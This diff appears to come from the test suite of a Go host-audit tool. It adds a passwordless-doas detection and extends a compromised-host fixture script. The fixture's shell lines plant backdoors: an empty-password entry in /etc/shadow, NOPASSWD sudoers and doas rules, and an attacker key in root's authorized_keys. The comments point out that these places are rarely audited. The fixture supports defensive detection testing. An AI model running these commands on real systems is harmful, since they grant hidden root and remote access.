@@ -237,6 +237,7 @@ func init() {
 			{ID: "priv.uid_zero", Sev: "CRITICAL", Subject: "sysadm"},
 			{ID: "priv.no_password", Sev: "CRITICAL", Subject: "sysadm"},
 			{ID: "priv.sudo_nopasswd", Sev: "CRITICAL", Subject: "sysadm"},
+			{ID: "priv.doas_nopasswd", Sev: "CRITICAL", Subject: ":wheel"},
 			{ID: "persist.ssh_keys", Sev: "MANUAL"},
 		},
 		Exit: 2,
@@ -255,6 +256,7 @@ func init() {
 			{ID: "priv.uid_zero", Sev: "CRITICAL", Subject: "sysadm"},
 			{ID: "priv.no_password", Sev: "CRITICAL", Subject: "sysadm"},
 			{ID: "priv.sudo_nopasswd", Sev: "CRITICAL", Subject: "sysadm"},
+			{ID: "priv.doas_nopasswd", Sev: "CRITICAL", Subject: ":wheel"},
 		},
 		Exit: 2,
 	})
@@ -507,6 +509,11 @@ printf 'sysadm::20000:0:99999:7:::\n' >> /etc/shadow
 # sudo sem senha, num arquivo que ninguém abre
 printf 'sysadm ALL=(ALL) NOPASSWD:ALL\n' > /etc/sudoers.d/90-sysadm
 chmod 440 /etc/sudoers.d/90-sysadm
+
+# doas sem senha: o mesmo backdoor no arquivo que quase ninguém audita porque
+# o reflexo é procurar em /etc/sudoers. Aqui num host que usa sudo, o que torna
+# a regra dupla anomalia — root sem senha por dois caminhos.
+printf 'permit nopass keepenv :wheel\n' > /etc/doas.conf
 
 # e a volta, sem restrição nenhuma: o invasor quer shell
 printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploDeAcessoRemoto sysadm@vps\n' >> /root/.ssh/authorized_keys
